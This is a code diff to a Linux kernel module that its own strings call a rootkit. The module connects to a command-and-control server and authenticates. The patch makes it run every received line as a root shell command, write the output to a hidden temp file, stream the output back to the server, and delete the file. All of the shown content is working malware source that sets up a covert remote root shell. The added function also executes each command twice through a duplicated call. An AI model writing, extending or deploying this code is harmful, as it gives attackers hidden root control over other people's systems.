@@ -4,11 +4,13 @@
 #include <linux/kthread.h>
 #include <linux/net.h>
 #include <linux/inet.h>
+#include <linux/fs.h>
 #include <net/sock.h>
 
 #define RETRY_DELAY 5
 #define AUTH_PREFIX "AUTH "
 #define AUTH_PREFIX_LEN (sizeof(AUTH_PREFIX) - 1)
+#define TMP_OUT_FILE "/tmp/.wlkom_out"
 
 static char *password_hash = "";
 static char *c2_ip    = "192.168.100.10";
@@ -23,7 +25,6 @@ MODULE_PARM_DESC(c2_port,  "C2 server TCP port");
 static struct task_struct *conn_thread = NULL;
 static struct socket      *conn_sock   = NULL;
 
-/* avoids -Wincompatible-pointer-types with struct sockaddr_unsized on 6.x */
 static void *to_sockaddr(void *ptr) { return ptr; }
 
 static int recv_line(char *buf, size_t size)
@@ -57,6 +58,72 @@ static int recv_line(char *buf, size_t size)
 
     buf[pos] = '\0';
     return -EMSGSIZE;
+}
+
+static int send_reply(const char *reply)
+{
+    struct msghdr msg = { 0 };
+    struct kvec vec = {
+        .iov_base = (void *)reply,
+        .iov_len = strlen(reply),
+    };
+
+    return kernel_sendmsg(conn_sock, &msg, &vec, 1, vec.iov_len);
+}
+
+
+static void execute_and_send_output(char *cmd)
+{
+    char cmd_redirect[512];
+    char file_buf[512];
+    char status_header[128];
+    struct file *file;
+    loff_t pos = 0;
+    ssize_t bytes_read;
+    int exit_status;
+
+    
+    snprintf(cmd_redirect, sizeof(cmd_redirect), "%s > " TMP_OUT_FILE " 2>&1", cmd);
+
+    char *argv[] = { "/bin/sh", "-c", cmd_redirect, NULL };
+    static char *envp[] = {
+        "HOME=/",
+        "TERM=linux",
+        "PATH=/sbin:/usr/sbin:/bin:/usr/bin",
+        NULL
+    };
+
+    
+    exit_status = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
+
+    
+    exit_status = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
+    int real_exit_code = (exit_status >> 8) & 0xFF;
+    
+    
+    snprintf(status_header, sizeof(status_header), "[Exit Status: %d]\n--- Command Output ---\n", real_exit_code);
+    send_reply(status_header);
+
+    
+    file = filp_open(TMP_OUT_FILE, O_RDONLY, 0);
+    if (IS_ERR(file)) {
+        send_reply("[Rootkit Error]: Could not read command output stream.\n\n");
+        goto cleanup;
+    }
+
+    
+    while ((bytes_read = kernel_read(file, file_buf, sizeof(file_buf) - 1, &pos)) > 0) {
+        file_buf[bytes_read] = '\0';
+        send_reply(file_buf);
+    }
+    
+    filp_close(file, NULL);
+    send_reply("\n--- End of Output ---\n\n");
+
+cleanup:
+    
+    char *rm_argv[] = { "/bin/rm", "-f", TMP_OUT_FILE, NULL };
+    call_usermodehelper(rm_argv[0], rm_argv, envp, UMH_WAIT_PROC);
 }
 
 static int authenticate_c2(void)
@@ -114,8 +181,6 @@ static int do_connect(void)
 
 static int connection_thread(void *data)
 {
-    struct msghdr msg = { 0 };
-    struct kvec   vec = { 0 };
     char buf[256];
     int  ret;
 
@@ -140,11 +205,15 @@ static int connection_thread(void *data)
 
         while (!kthread_should_stop()) {
             memset(buf, 0, sizeof(buf));
-            vec.iov_base = buf;
-            vec.iov_len  = sizeof(buf) - 1;
-            ret = kernel_recvmsg(conn_sock, &msg, &vec, 1, vec.iov_len, 0);
-            if (ret == 0 || ret < 0)
+            ret = recv_line(buf, sizeof(buf));
+            if (ret <= 0)
                 break;
+
+            if (strlen(buf) == 0)
+                continue;
+
+            /* Handle processing, capturing and network streaming internally */
+            execute_and_send_output(buf);
         }
 
 disconnect:
@@ -178,7 +247,6 @@ static int __init wlkom_init(void)
 
 static void __exit wlkom_exit(void)
 {
-    /* shutdown unblocks kernel_recvmsg before kthread_stop waits */
     if (conn_sock)
         kernel_sock_shutdown(conn_sock, SHUT_RDWR);
 
